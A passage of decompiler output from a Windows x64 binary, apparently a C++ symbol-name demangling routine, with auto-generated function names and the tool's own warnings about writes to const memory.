    v13 = sub_13F1616BC(v12, (__int64)v51, a1);
    v2 = 1;
LABEL_36:
    *(_QWORD *)a1 = *(_QWORD *)v13;
    *(_DWORD *)(a1 + 8) = *(_DWORD *)(v13 + 8);
LABEL_37:
    if ( *(_BYTE *)(a1 + 8) )
      break;
  }
  if ( aAvrsafunctionC[25] )
  {
    if ( aAvrsafunctionC[25] != 64 )
    {
      *(_DWORD *)(a1 + 8) = 0;
      *(_BYTE *)(a1 + 8) = 2;
      *(_QWORD *)a1 = 0i64;
    }
  }
  else if ( *(_QWORD *)a1 )
  {
    v25 = 0;
    v24 = qword_13F18D620;
    v19 = sub_13F161714((__int64)&v24, (__int64)v42, "::");
    v20 = sub_13F1616BC(v19, (__int64)v41, a1);
    *(_QWORD *)a1 = *(_QWORD *)v20;
    *(_DWORD *)(a1 + 8) = *(_DWORD *)(v20 + 8);
  }
  else
  {
    *(_DWORD *)(a1 + 8) = 0;
    *(_BYTE *)(a1 + 8) = 1;
    *(_QWORD *)a1 = qword_13F18D620;
  }
  return a1;
}
// 13F165BEE: write access to const memory at 13F1C5F88 has been detected
// 13F165C4D: write access to const memory at 13F1C5F88 has been detected
// 13F165D41: write access to const memory at 13F1C5F88 has been detected
// 13F165D8C: write access to const memory at 13F1C5F88 has been detected
// 13F165DCD: write access to const memory at 13F1C5F88 has been detected
// 13F165EA5: write access to const memory at 13F1C5F88 has been detected
// 13F18D620: using guessed type __int64 qword_13F18D620[4];
// 13F1C5F78: using guessed type __int64 qword_13F1C5F78;
// 13F1C5F88: using guessed type void *off_13F1C5F88;
// 13F1C5F9C: using guessed type char byte_13F1C5F9C;
// 13F1C5F9D: using guessed type char byte_13F1C5F9D;
// 13F165B08: using guessed type char var_120[16];
// 13F165B08: using guessed type char var_110[16];
// 13F165B08: using guessed type char var_F0[16];
// 13F165B08: using guessed type char var_E0[16];
// 13F165B08: using guessed type char var_D0[16];
// 13F165B08: using guessed type char var_C0[16];
// 13F165B08: using guessed type char var_B0[16];
// 13F165B08: using guessed type char var_A0[16];
// 13F165B08: using guessed type char var_90[16];
// 13F165B08: using guessed type char var_80[16];
// 13F165B08: using guessed type char var_70[16];
// 13F165B08: using guessed type char var_60[16];
// 13F165B08: using guessed type char var_40[16];
// 13F165B08: using guessed type char var_30[16];

//----- (000000013F165F80) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
__int64 __fastcall sub_13F165F80(__int64 a1)
{
  __int64 v2; // rax
  __int64 v3; // rcx
  __int64 v4; // rax
  __int64 v5; // rax
  __int64 v6; // rax
  __int64 v7; // rax
  __int64 v8; // rax
  __int64 *v10; // [rsp+20h] [rbp-38h] BYREF
  int v11; // [rsp+28h] [rbp-30h]
  char v12[16]; // [rsp+30h] [rbp-28h] BYREF
  char v13[24]; // [rsp+40h] [rbp-18h] BYREF

  *(_QWORD *)a1 = 0i64;
  *(_DWORD *)(a1 + 8) = 0;
  v2 = sub_13F167320((__int64)&v10, 1, 0);
  v3 = *(_QWORD *)v2;
  *(_QWORD *)a1 = *(_QWORD *)v2;
  LODWORD(v2) = *(_DWORD *)(v2 + 8);
  *(_DWORD *)(a1 + 8) = v2;
  if ( !(_BYTE)v2 && aAvrsafunctionC[25] )
  {
    if ( aAvrsafunctionC[25] == 64 )
    {
LABEL_6:
      off_13F1C5F88 = &aAvrsafunctionC[26];
      return a1;
    }
    v4 = sub_13F165B08((__int64)&v10);
    v5 = sub_13F161714(v4, (__int64)v12, "::");
    v6 = sub_13F1616BC(v5, (__int64)v13, a1);
    v3 = *(_QWORD *)v6;
    *(_QWORD *)a1 = *(_QWORD *)v6;
    *(_DWORD *)(a1 + 8) = *(_DWORD *)(v6 + 8);
  }
  if ( aAvrsafunctionC[25] == 64 )
    goto LABEL_6;
  if ( aAvrsafunctionC[25] )
  {
    *(_DWORD *)(a1 + 8) = 0;
    *(_QWORD *)a1 = 0i64;
    *(_BYTE *)(a1 + 8) = 2;
  }
  else if ( v3 )
  {
    v11 = 0;
    v10 = qword_13F18D620;
    v7 = sub_13F161714((__int64)&v10, (__int64)v13, "::");
    v8 = sub_13F1616BC(v7, (__int64)v12, a1);
    *(_QWORD *)a1 = *(_QWORD *)v8;
    *(_DWORD *)(a1 + 8) = *(_DWORD *)(v8 + 8);
  }
  else
  {
    *(_DWORD *)(a1 + 8) = 0;
    *(_BYTE *)(a1 + 8) = 1;
    *(_QWORD *)a1 = qword_13F18D620;
  }
  return a1;
}
// 13F16600A: write access to const memory at 13F1C5F88 has been detected
// 13F18D620: using guessed type __int64 qword_13F18D620[4];
// 13F1C5F88: using guessed type void *off_13F1C5F88;

//----- (000000013F166084) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
__int64 __fastcall sub_13F166084(__int64 a1)
{
  __int64 v2; // rax
  __int64 v3; // rbx
  __int64 v5; // [rsp+20h] [rbp-28h] BYREF
  int v6; // [rsp+28h] [rbp-20h]
  char v7[24]; // [rsp+30h] [rbp-18h] BYREF
  char v8; // [rsp+58h] [rbp+10h] BYREF

  if ( aAvrsafunctionC[25] )
  {
    if ( aAvrsafunctionC[25] == 63 )
    {
      off_13F1C5F88 = &aAvrsafunctionC[26];
      v2 = sub_13F163E7C((__int64)v7, 0);
      v5 = 0i64;
      v6 = 0;
      v8 = 45;
      v3 = v2;
      sub_13F1627A8((__int64)&v5, &v8, 1u);
      sub_13F1616BC((__int64)&v5, a1, v3);
    }
    else
    {
      sub_13F163E7C(a1, 0);
    }
  }
  else
  {
    *(_DWORD *)(a1 + 8) = 0;
    *(_QWORD *)a1 = qword_13F18D620;
  }
  return a1;
}
// 13F1660B7: write access to const memory at 13F1C5F88 has been detected
// 13F18D620: using guessed type __int64 qword_13F18D620[4];
// 13F1C5F88: using guessed type void *off_13F1C5F88;
// 13F166084: using guessed type char var_18[24];

//----- (000000013F166118) ----------------------------------------------------
__int64 __fastcall sub_13F166118(_QWORD *a1, _BYTE *a2, int a3)
{
  __int64 (__fastcall ***v5)(_QWORD); // rcx
  __int64 v6; // rbx
  _BYTE *v7; // rax

  v5 = (__int64 (__fastcall ***)(_QWORD))*a1;
  v6 = (__int64)a2;
  if ( v5 )
  {
    if ( a2 || (a3 = (**v5)(v5) + 1, (v6 = sub_13F164BD0((__int64)&off_13F1C5FB0, a3, 0)) != 0) )
    {
      if ( *a1 )
        v7 = (_BYTE *)(*(__int64 (__fastcall **)(_QWORD, __int64, __int64))(*(_QWORD *)*a1 + 16i64))(
                        *a1,
                        v6,
                        v6 + a3 - 1i64);
      else
        v7 = (_BYTE *)v6;
      *v7 = 0;
    }
  }
  else if ( a2 )
  {
    *a2 = 0;
  }
  return v6;
}
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);
// 13F1C5FB0: using guessed type __int64 (__fastcall *off_13F1C5FB0)(_QWORD);

//----- (000000013F1661AC) ----------------------------------------------------
_BYTE *__fastcall sub_13F1661AC(__int64 a1, _BYTE *a2, int a3)
{
  unsigned int v3; // ecx
  int v4; // er8
  __int64 v5; // r10
  _BYTE *v6; // r8

  if ( *(_DWORD *)(a1 + 8) != 1 )
    return a2;
  v3 = 4;
  v4 = a3 - (_DWORD)a2;
  if ( v4 >= 4 || (v3 = v4) != 0 )
  {
    v5 = v3;
    v6 = a2;
    do
    {
      *v6 = v6[" ?? " - a2];
      ++v6;
      --v5;
    }
    while ( v5 );
  }
  return &a2[v3];
}

//----- (000000013F1661F4) ----------------------------------------------------
_BYTE *__fastcall sub_13F1661F4(__int64 a1, _BYTE *a2, unsigned __int64 a3)
{
  if ( (unsigned __int64)a2 < a3 )
    *a2++ = *(_BYTE *)(a1 + 8);
  return a2;
}

//----- (000000013F166208) ----------------------------------------------------
__int64 __fastcall sub_13F166208(__int64 a1, __int64 a2)
{
  __int64 *v2; // rcx
  __int64 v3; // rcx

  v2 = *(__int64 **)(a1 + 8);
  if ( v2 )
  {
    v3 = *v2;
    if ( v3 )
      return (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v3 + 16i64))(v3);
  }
  return a2;
}
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);

//----- (000000013F166238) ----------------------------------------------------
unsigned __int64 __fastcall sub_13F166238(__int64 a1, __int64 a2, unsigned __int64 a3)
{
  unsigned __int64 result; // rax

  result = (*(__int64 (__fastcall **)(_QWORD))(**(_QWORD **)(a1 + 8) + 16i64))(*(_QWORD *)(a1 + 8));
  if ( result < a3 )
    return (*(__int64 (__fastcall **)(_QWORD, unsigned __int64, unsigned __int64))(**(_QWORD **)(a1 + 16) + 16i64))(
             *(_QWORD *)(a1 + 16),
             result,
             a3);
  return result;
}
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);

//----- (000000013F166284) ----------------------------------------------------
_BYTE *__fastcall sub_13F166284(__int64 a1, _BYTE *a2, int a3)
{
  __int64 v3; // r10
  unsigned int v4; // er8
  unsigned int v5; // er9
  _BYTE *v6; // rcx
  __int64 v7; // r10

  v3 = *(_QWORD *)(a1 + 8);
  v4 = a3 - (_DWORD)a2;
  if ( *(_DWORD *)(a1 + 16) <= (signed int)v4 )
    v4 = *(_DWORD *)(a1 + 16);
  v5 = 0;
  if ( v4 )
  {
    v6 = a2;
    v7 = v3 - (_QWORD)a2;
    do
    {
      ++v5;
      *v6 = v6[v7];
      ++v6;
    }
    while ( v5 < v4 );
  }
  return &a2[v4];
}

//----- (000000013F1662BC) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
__int64 __fastcall sub_13F1662BC(__int64 a1, char *a2)
{
  char v3; // al
  char *i; // rax
  __int64 v6; // [rsp+20h] [rbp-28h] BYREF
  int v7; // [rsp+28h] [rbp-20h]
  char v8[24]; // [rsp+30h] [rbp-18h] BYREF

  sub_13F161444((__int64)&v6, a2);
  off_13F1C5F88 = &aAvrsafunctionC[26];
  if ( aAvrsafunctionC[25] == 64 && (v3 = aAvrsafunctionC[26], off_13F1C5F88 = &aAvrsafunctionC[27], v3 == 95) )
  {
    off_13F1C5F88 = &aAvrsafunctionC[28];
    sub_13F163E7C((__int64)v8, 0);
    sub_13F163E7C((__int64)v8, 0);
    for ( i = ""; *i && *i != 64; off_13F1C5F88 = i )
      ++i;
    if ( *i )
    {
      off_13F1C5F88 = i + 1;
      *(_QWORD *)a1 = v6;
      *(_DWORD *)(a1 + 8) = v7;
    }
    else
    {
      *(_DWORD *)(a1 + 8) = 0;
      off_13F1C5F88 = i - 1;
      *(_QWORD *)a1 = qword_13F18D620;
    }
  }
  else
  {
    *(_DWORD *)(a1 + 8) = 0;
    *(_QWORD *)a1 = 0i64;
    *(_BYTE *)(a1 + 8) = 2;
  }
  return a1;
}
// 13F1662DC: write access to const memory at 13F1C5F88 has been detected
// 13F1662F1: write access to const memory at 13F1C5F88 has been detected
// 13F166307: write access to const memory at 13F1C5F88 has been detected
// 13F166330: write access to const memory at 13F1C5F88 has been detected
// 13F166349: write access to const memory at 13F1C5F88 has been detected
// 13F16635F: write access to const memory at 13F1C5F88 has been detected
// 13F18D620: using guessed type __int64 qword_13F18D620[4];
// 13F1C5F88: using guessed type void *off_13F1C5F88;

//----- (000000013F16638C) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
__int64 __fastcall sub_13F16638C(__int64 a1)
{
  if ( aAvrsafunctionC[25] == 63 )
  {
    if ( aAvrsafunctionC[26] == 36 )
    {
      sub_13F166A94(a1, 1);
    }
    else
    {
      off_13F1C5F88 = &aAvrsafunctionC[26];
      sub_13F164D38(a1, 0, 0i64);
    }
  }
  else
  {
    sub_13F167320(a1, 1, 0);
  }
  return a1;
}
// 13F1663B5: write access to const memory at 13F1C5F88 has been detected
// 13F1C5F88: using guessed type void *off_13F1C5F88;

//----- (000000013F1663D8) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
__int64 __fastcall sub_13F1663D8(__int64 a1)
{
  char v1; // si
  char *v3; // rcx
  int v4; // eax
  char v5; // r14
  __int64 v6; // rax
  char *v7; // rdi
  char *v8; // r8
  char v9; // r9
  char v10; // al
  _BYTE *v11; // rcx
  __int64 v12; // rax
  __int64 v13; // rax
  __int64 v15; // [rsp+28h] [rbp-99h] BYREF
  __int64 v16; // [rsp+30h] [rbp-91h]
  __int64 v17[2]; // [rsp+38h] [rbp-89h] BYREF
  __int64 v18; // [rsp+48h] [rbp-79h] BYREF
  int v19; // [rsp+50h] [rbp-71h]
  char v20[16]; // [rsp+68h] [rbp-59h] BYREF
  char v21[16]; // [rsp+78h] [rbp-49h] BYREF
  char v22[16]; // [rsp+88h] [rbp-39h] BYREF
  char v23[16]; // [rsp+B8h] [rbp-9h] BYREF
  char v24[16]; // [rsp+C8h] [rbp+7h] BYREF
  char v25[16]; // [rsp+D8h] [rbp+17h] BYREF

  v1 = 1;
  *(_DWORD *)(a1 + 8) = 0;
  *(_QWORD *)a1 = 0i64;
  byte_13F1C5F9D = 1;
  if ( !*(_BYTE *)(a1 + 8) )
  {
    v3 = "";
    do
    {
      if ( (*v3 & 0xBF) == 0 )
        break;
      v4 = *v3;
      v5 = 0;
      v15 = 0i64;
      LODWORD(v16) = 0;
      if ( (unsigned int)(v4 - 48) <= 9 )
      {
        off_13F1C5F88 = v3 + 1;
        v6 = sub_13F16167C(0i64, (__int64)v21, v4 - 48);
        v15 = *(_QWORD *)v6;
        LODWORD(v16) = *(_DWORD *)(v6 + 8);
        goto LABEL_31;
      }
      v7 = v3;
      v8 = v3;
      if ( *v3 != 36 || v3[1] != 36 )
        goto LABEL_19;
      v9 = 0;
      switch ( v3[2] )
      {
        case '$':
          if ( v3[3] == 86 )
          {
            v3 += 4;
            v9 = 1;
            off_13F1C5F88 = v3;
            v8 = v3;
          }
          break;
        case 'U':
          goto LABEL_15;
        case 'V':
          goto LABEL_13;
        case 'W':
          v5 = 1;
LABEL_15:
          v3 += 3;
          off_13F1C5F88 = v3;
          v8 = v3;
LABEL_19:
          v10 = *v3;
          if ( *v3 == 88 )
          {
            off_13F1C5F88 = v8 + 1;
            sub_13F161644((__int64)&v15, "void");
          }
          else
          {
            if ( v10 != 36 || (v11 = v3 + 1, *v11 == 36) )
            {
              if ( v10 == 63 )
              {
                sub_13F166084((__int64)v17);
                v13 = sub_13F161444((__int64)v23, "`template-parameter");
                sub_13F1616BC(v13, (__int64)v20, (__int64)v17);
                v12 = sub_13F161714((__int64)v20, (__int64)v24, (char *)&qword_13F19B5B0);
              }
              else
              {
                v18 = 0i64;
                v19 = 0;
                v12 = sub_13F1654A8((__int64)v25, (__int64)&v18);
              }
            }
            else
            {
              off_13F1C5F88 = v11;
              v12 = sub_13F1666F4((__int64)v22);
            }
            v15 = *(_QWORD *)v12;
            LODWORD(v16) = *(_DWORD *)(v12 + 8);
          }
          v3 = "";
          if ( "" - v7 > 1 && MEMORY[0] != 9 )
          {
            sub_13F161928(0i64, (__int64)&v15);
LABEL_31:
            v3 = "";
          }
          if ( v15 )
          {
            if ( !v1 )
              sub_13F1617B0(a1, 44);
            sub_13F16176C(a1, (__int64)&v15);
            if ( v5 )
              sub_13F161830(a1, "...");
            v3 = "";
          }
          goto LABEL_38;
        case 'Z':
LABEL_13:
          v3 += 3;
          off_13F1C5F88 = v3;
          goto LABEL_38;
      }
      if ( !v9 )
        goto LABEL_19;
LABEL_38:
      v1 = 0;
    }
    while ( !*(_BYTE *)(a1 + 8) );
  }
  byte_13F1C5F9D = 0;
  return a1;
}
// 13F166415: write access to const memory at 13F1C5F9D has been detected
// 13F166457: write access to const memory at 13F1C5F88 has been detected
// 13F1664B6: write access to const memory at 13F1C5F88 has been detected
// 13F1664C9: write access to const memory at 13F1C5F88 has been detected
// 13F1664E2: write access to const memory at 13F1C5F88 has been detected
// 13F1664FF: write access to const memory at 13F1C5F88 has been detected
// 13F166527: write access to const memory at 13F1C5F88 has been detected
// 13F1666BF: write access to const memory at 13F1C5F9D has been detected
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);
// 13F19B5B0: using guessed type __int64 qword_13F19B5B0;
// 13F1C5F88: using guessed type void *off_13F1C5F88;
// 13F1C5F9D: using guessed type char byte_13F1C5F9D;
// 13F1663D8: using guessed type char var_A0[16];
// 13F1663D8: using guessed type char var_90[16];
// 13F1663D8: using guessed type char var_60[16];
// 13F1663D8: using guessed type char var_50[16];
// 13F1663D8: using guessed type char var_40[16];

//----- (000000013F1666F4) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
__int64 __fastcall sub_13F1666F4(__int64 a1)
{
  __int64 v2; // rax
  __int64 v3; // rax
  __int64 *v4; // r8
  __int64 v5; // rcx
  __int64 v6; // rbx
  __int64 v7; // rax
  __int64 v8; // rax
  __int64 v9; // rax
  __int64 v10; // rax
  __int16 v12; // bx
  char *v13; // rdx
  __int64 v14; // rax
  char v15[8]; // [rsp+28h] [rbp-79h] BYREF
  char v16[16]; // [rsp+30h] [rbp-71h] BYREF
  __int64 v17; // [rsp+40h] [rbp-61h] BYREF
  char v18; // [rsp+48h] [rbp-59h]
  char v19[16]; // [rsp+50h] [rbp-51h] BYREF
  __int64 v20; // [rsp+60h] [rbp-41h] BYREF
  int v21; // [rsp+68h] [rbp-39h]
  char v22[9]; // [rsp+6Fh] [rbp-32h] BYREF
  char v23; // [rsp+78h] [rbp-29h] BYREF
  char v24; // [rsp+79h] [rbp-28h] BYREF
  char v25; // [rsp+7Ah] [rbp-27h]

  off_13F1C5F88 = &aAvrsafunctionC[26];
  if ( aAvrsafunctionC[25] > 74 )
  {
    if ( aAvrsafunctionC[25] == 81 )
      goto LABEL_38;
    if ( aAvrsafunctionC[25] != 82 )
    {
      if ( aAvrsafunctionC[25] == 83 )
      {
        *(_QWORD *)a1 = 0i64;
        *(_DWORD *)(a1 + 8) = 0;
        return a1;
      }
      if ( (unsigned int)(aAvrsafunctionC[25] - 84) > 2 )
        goto LABEL_38;
    }
    sub_13F166084((__int64)&v17);
    if ( v17 )
      *(_BYTE *)(*(__int64 (__fastcall **)(__int64, __int64 *, char *))(*(_QWORD *)v17 + 16i64))(v17, &v20, v22) = 0;
    else
      LOBYTE(v20) = 0;
    v12 = sub_13F16E158((__int64)&v20);
    sub_13F10D3E0(&v20, 0x10ui64, (__int64)"%d", v12 & 0xFFF);
    sub_13F161444((__int64)&v17, (char *)&v20);
    switch ( aAvrsafunctionC[25] )
    {
      case 'R':
      case 'T':
        v13 = "`template-type-parameter-";
        break;
      case 'U':
        v13 = "`generic-class-parameter-";
        break;
      case 'V':
        v13 = "`generic-method-parameter-";
        break;
      default:
        goto LABEL_38;
    }
    v14 = sub_13F161444((__int64)v19, v13);
    sub_13F1616BC(v14, (__int64)v16, (__int64)&v17);
    sub_13F161714((__int64)v16, a1, (char *)&qword_13F19B5B0);
    return a1;
  }
  if ( aAvrsafunctionC[25] >= 70 )
  {
    v20 = 0i64;
    v21 = 0;
    v15[0] = 123;
    sub_13F1627A8((__int64)&v20, v15, 1u);
    if ( (unsigned __int8)(aAvrsafunctionC[25] - 72) <= 2u )
    {
      v7 = sub_13F163BD4((__int64)v16);
      sub_13F16176C((__int64)&v20, v7);
      sub_13F1617B0((__int64)&v20, 44);
    }
    if ( aAvrsafunctionC[25] == 70 )
      goto LABEL_31;
    if ( aAvrsafunctionC[25] != 71 )
    {
      if ( aAvrsafunctionC[25] == 72 )
      {
LABEL_32:
        v10 = sub_13F166084((__int64)v16);
        sub_13F16176C((__int64)&v20, v10);
        goto LABEL_33;
      }
      if ( aAvrsafunctionC[25] == 73 )
      {
LABEL_31:
        v9 = sub_13F166084((__int64)v16);
        sub_13F16176C((__int64)&v20, v9);
        sub_13F1617B0((__int64)&v20, 44);
        goto LABEL_32;
      }
      if ( aAvrsafunctionC[25] != 74 )
      {
LABEL_33:
        sub_13F1616E8((__int64)&v20, a1, 125);
        return a1;
      }
    }
    v8 = sub_13F166084((__int64)v16);
    sub_13F16176C((__int64)&v20, v8);
    sub_13F1617B0((__int64)&v20, 44);
    goto LABEL_31;
  }
  switch ( aAvrsafunctionC[25] )
  {
    case 0:
      off_13F1C5F88 = "";
      goto LABEL_22;
    case 48:
      sub_13F166084(a1);
      return a1;
    case 49:
      if ( aAvrsafunctionC[26] == 64 )
      {
        off_13F1C5F88 = &aAvrsafunctionC[27];
        sub_13F161444(a1, "NULL");
        return a1;
      }
      v6 = sub_13F161444((__int64)v16, "&");
      v4 = (__int64 *)sub_13F163BD4((__int64)&v17);
      v5 = v6;
      goto LABEL_16;
    case 50:
      sub_13F166084((__int64)&v17);
      sub_13F166084((__int64)&v20);
      if ( v18 <= 1 && (char)v21 <= 1 )
      {
        if ( !sub_13F166118(&v17, &v24, 99) )
          goto LABEL_38;
        v23 = v24;
        if ( v24 == 45 )
        {
          v24 = v25;
          v25 = 46;
        }
        else
        {
          v24 = 46;
        }
        v2 = sub_13F161444((__int64)v16, &v23);
        v3 = sub_13F1616E8(v2, (__int64)&v17, 101);
        v4 = &v20;
        v5 = v3;
LABEL_16:
        sub_13F1616BC(v5, a1, (__int64)v4);
        return a1;
      }
LABEL_22:
      *(_DWORD *)(a1 + 8) = 0;
      *(_QWORD *)a1 = qword_13F18D620;
      return a1;
  }
  if ( aAvrsafunctionC[25] != 69 )
  {
LABEL_38:
    *(_DWORD *)(a1 + 8) = 0;
    *(_QWORD *)a1 = 0i64;
    *(_BYTE *)(a1 + 8) = 2;
    return a1;
  }
  sub_13F163BD4(a1);
  return a1;
}
// 13F16672E: write access to const memory at 13F1C5F88 has been detected
// 13F166813: write access to const memory at 13F1C5F88 has been detected
// 13F166863: write access to const memory at 13F1C5F88 has been detected
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);
// 13F18D620: using guessed type __int64 qword_13F18D620[4];
// 13F19B5B0: using guessed type __int64 qword_13F19B5B0;
// 13F1C5F88: using guessed type void *off_13F1C5F88;
// 13F1666F4: using guessed type char var_D0[8];
// 13F1666F4: using guessed type char var_89[9];
// 13F1666F4: using guessed type char var_A8[16];

//----- (000000013F166A94) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
__int64 __fastcall sub_13F166A94(__int64 a1, char a2)
{
  char v4; // bl
  bool v5; // zf
  __int64 v6; // rax
  __int64 v7; // rcx
  __int64 v8; // rax
  __int64 v9; // rbx
  __int64 v11; // [rsp+20h] [rbp-E0h] BYREF
  int v12; // [rsp+28h] [rbp-D8h]
  __int64 v13; // [rsp+30h] [rbp-D0h] BYREF
  int v14; // [rsp+38h] [rbp-C8h]
  char v15[16]; // [rsp+40h] [rbp-C0h] BYREF
  char v16[16]; // [rsp+50h] [rbp-B0h] BYREF
  int v17; // [rsp+60h] [rbp-A0h] BYREF
  int v18; // [rsp+C0h] [rbp-40h] BYREF
  int v19; // [rsp+120h] [rbp+20h] BYREF
  char v20; // [rsp+1C0h] [rbp+C0h] BYREF
  __int64 v21; // [rsp+1C8h] [rbp+C8h]

  if ( aAvrsafunctionC[25] == 63 && aAvrsafunctionC[26] == 36 )
  {
    v4 = 0;
    v21 = 0i64;
    qword_13F1C5F70 = (__int64)&v17;
    v17 = -1;
    qword_13F1C5F78 = (__int64)&v18;
    qword_13F1C5F80 = (__int64)&v19;
    v18 = -1;
    v19 = -1;
    off_13F1C5F88 = &aAvrsafunctionC[27];
    v5 = aAvrsafunctionC[27] == 63;
    v20 = 0;
    if ( v5 )
    {
      off_13F1C5F88 = &aAvrsafunctionC[28];
      v6 = sub_13F164D38((__int64)v15, 1, &v20);
      v4 = v20;
    }
    else
    {
      v6 = sub_13F167320((__int64)v15, 1, 1);
    }
    v7 = *(_QWORD *)v6;
    v12 = *(_DWORD *)(v6 + 8);
    v11 = v7;
    byte_13F1C5F9C = v7 == 0;
    if ( !v4 )
    {
      v8 = sub_13F1663D8((__int64)v16);
      v13 = 0i64;
      v14 = 0;
      v20 = 60;
      v9 = v8;
      sub_13F1627A8((__int64)&v13, &v20, 1u);
      sub_13F1616BC((__int64)&v13, (__int64)v15, v9);
      sub_13F16176C((__int64)&v11, (__int64)v15);
      if ( v11 && (*(unsigned __int8 (__fastcall **)(__int64))(*(_QWORD *)v11 + 8i64))(v11) == 62 )
        sub_13F1617B0((__int64)&v11, 32);
      sub_13F1617B0((__int64)&v11, 62);
      if ( a2 && aAvrsafunctionC[25] )
        off_13F1C5F88 = &aAvrsafunctionC[26];
      v7 = v11;
    }
    qword_13F1C5F80 = v21;
    *(_DWORD *)(a1 + 8) = v12;
    qword_13F1C5F70 = 2157184i64;
    qword_13F1C5F78 = 2157272i64;
    *(_QWORD *)a1 = v7;
  }
  else
  {
    *(_DWORD *)(a1 + 8) = 0;
    *(_QWORD *)a1 = 0i64;
    *(_BYTE *)(a1 + 8) = 2;
  }
  return a1;
}
// 13F166AFD: write access to const memory at 13F1C5F70 has been detected
// 13F166B10: write access to const memory at 13F1C5F78 has been detected
// 13F166B1B: write access to const memory at 13F1C5F80 has been detected
// 13F166B30: write access to const memory at 13F1C5F88 has been detected
// 13F166B4C: write access to const memory at 13F1C5F88 has been detected
// 13F166B85: write access to const memory at 13F1C5F9C has been detected
// 13F166C2E: write access to const memory at 13F1C5F88 has been detected
// 13F166C41: write access to const memory at 13F1C5F80 has been detected
// 13F166C4F: write access to const memory at 13F1C5F70 has been detected
// 13F166C56: write access to const memory at 13F1C5F78 has been detected
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);
// 13F1C5F70: using guessed type __int64 qword_13F1C5F70;
// 13F1C5F78: using guessed type __int64 qword_13F1C5F78;
// 13F1C5F80: using guessed type __int64 qword_13F1C5F80;
// 13F1C5F88: using guessed type void *off_13F1C5F88;
// 13F1C5F9C: using guessed type char byte_13F1C5F9C;
// 13F166A94: using guessed type char var_150[16];

//----- (000000013F166C90) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
__int64 __fastcall sub_13F166C90(__int64 a1)
{
  __int64 result; // rax

  *(_QWORD *)a1 = 0i64;
  *(_DWORD *)(a1 + 8) = 0;
  result = a1;
  if ( aAvrsafunctionC[25] == 90 )
    off_13F1C5F88 = &aAvrsafunctionC[26];
  return result;
}
// 13F166CAB: write access to const memory at 13F1C5F88 has been detected
// 13F1C5F88: using guessed type void *off_13F1C5F88;

//----- (000000013F166CB4) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
int sub_13F166CB4()
{
  char *v0; // r8
  int v1; // edx
  char *v2; // r8
  int v3; // ecx
  char *v4; // rax
  char *v5; // r8
  int v7; // edx
  int v8; // er10
  int v9; // ecx
  int v10; // ecx
  int v11; // ecx
  char v12; // al
  int v13; // ecx
  int v14; // er9
  char v15; // cl
  int v16; // ecx
  int v17; // ecx
  int v18; // ecx
  int v19; // ecx
  int v20; // ecx
  int v21; // ecx
  int v22; // ecx
  int v23; // ecx
  int v24; // er9
  int v25; // ecx
  int v26; // eax
  int v27; // er9

  v0 = "";
  while ( 1 )
  {
    v1 = 0;
    if ( *v0 == 95 )
    {
      ++v0;
      v1 = 0x4000;
      off_13F1C5F88 = v0;
    }
    if ( (unsigned __int8)(*v0 - 65) <= 0x19u )
    {
      v24 = *v0 - 65;
      v25 = v1 | 0x8000;
      off_13F1C5F88 = v0 + 1;
      v7 = v1 | 0xA000;
      if ( (v24 & 1) == 0 )
        v7 = v25;
      if ( v24 < 24 )
      {
        v7 |= 0x800u;
        v26 = v24 & 0x18;
        if ( (v24 & 0x18) != 0 )
        {
          if ( v26 == 8 )
          {
            v7 |= 0x80u;
          }
          else if ( v26 != 16 )
          {
            return 0xFFFF;
          }
        }
        else
        {
          v7 |= 0x40u;
        }
        v27 = v24 & 6;
        if ( v27 )
        {
          switch ( v27 )
          {
            case 2:
              return v7 | 0x200;
            case 4:
              return v7 | 0x100;
            case 6:
              return v7 | 0x400;
            default:
              return 0xFFFF;
          }
        }
      }
      return v7;
    }
    if ( *v0 != 36 )
      break;
    v2 = v0 + 1;
    off_13F1C5F88 = v2;
    v3 = *v2;
    if ( v3 > 66 )
    {
      v9 = v3 - 67;
      if ( v9 )
      {
        v10 = v9 - 1;
        if ( v10 )
        {
          v11 = v10 - 1;
          if ( v11 )
          {
            if ( v11 != 13 )
              return 0xFFFF;
            off_13F1C5F88 = ++v2;
            v12 = *v2;
            if ( *v2 < 48 )
              return 0xFFFF - (v12 != 0);
            v8 = 1;
            if ( v12 > 53 )
              return 0xFFFF - (v12 != 0);
            goto LABEL_39;
          }
          v7 = v1 | 0x9200;
        }
        else
        {
          v7 = v1 | 0x9100;
        }
      }
      else
      {
        v7 = 31744;
      }
LABEL_51:
      off_13F1C5F88 = v2 + 1;
      return v7;
    }
    if ( v3 == 66 )
    {
      v7 = v1 | 0x9800;
      goto LABEL_51;
    }
    if ( !*v2 )
    {
      v7 = 65534;
      --v2;
      goto LABEL_51;
    }
    if ( v3 != 36 )
    {
      if ( v3 <= 47 )
        return 0xFFFF;
      v8 = 0;
      if ( v3 > 53 )
      {
        if ( v3 != 65 )
          return 0xFFFF;
        v7 = v1 | 0x9000;
        goto LABEL_51;
      }
LABEL_39:
      v13 = v1 | ((v8 + 5) << 8) | 0x8800;
      v7 = v1 | ((v8 + 5) << 8) | 0xA800;
      if ( (*v2 & 1) == 0 )
        v7 = v13;
      v14 = *v2 & 6;
      if ( (*v2 & 6) != 0 )
      {
        if ( v14 == 2 )
        {
          v7 |= 0x80u;
        }
        else if ( v14 != 4 )
        {
          return 0xFFFF;
        }
      }
      else
      {
        v7 |= 0x40u;
      }
      goto LABEL_51;
    }
    v4 = v2 + 1;
    if ( v2[1] != 80 )
      v4 = v2;
    v5 = v4 + 1;
    off_13F1C5F88 = v4 + 1;
